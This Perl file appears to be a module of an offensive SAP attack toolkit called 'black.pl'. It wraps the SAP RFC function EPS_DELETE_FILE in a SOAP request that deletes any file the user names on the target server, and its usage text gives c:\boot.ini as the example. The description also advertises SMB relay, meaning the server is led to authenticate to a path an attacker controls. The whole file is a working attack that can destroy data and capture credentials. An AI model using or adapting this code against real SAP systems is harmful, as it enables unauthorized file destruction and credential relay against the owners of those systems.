#!/usr/bin/perl
# Module file deleter EPS_DELETE_FILE


# CONFIG
######################
my $desc ="File deleter + SMB relay (EPS_DELETE_FILE) \n\t Usage: black.pl .. .. -m id_module <path> <file>\n\t A path like this: c:\\\n\t File name likes boot.ini\n"; 
our $funcName="EPS_DELETE_FILE_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub EPS_DELETE_FILE_Func()
{
	
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <EPS_DELETE_FILE xmlns="urn:sap-com:document:sap:rfc:functions">
           <DIR_NAME>%PATH%</DIR_NAME>
           <FILE_NAME>%FILE%</FILE_NAME>
           <IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>
           <IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>
        </EPS_DELETE_FILE>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	if ($ARGV[$m_arg_i+2]){
		$file=$ARGV[$m_arg_i+2];
		print $file." - file \n\n";
	} else {
		print "Error. Please, enter file name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;
	$XML=~s/%FILE%/$file/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";
}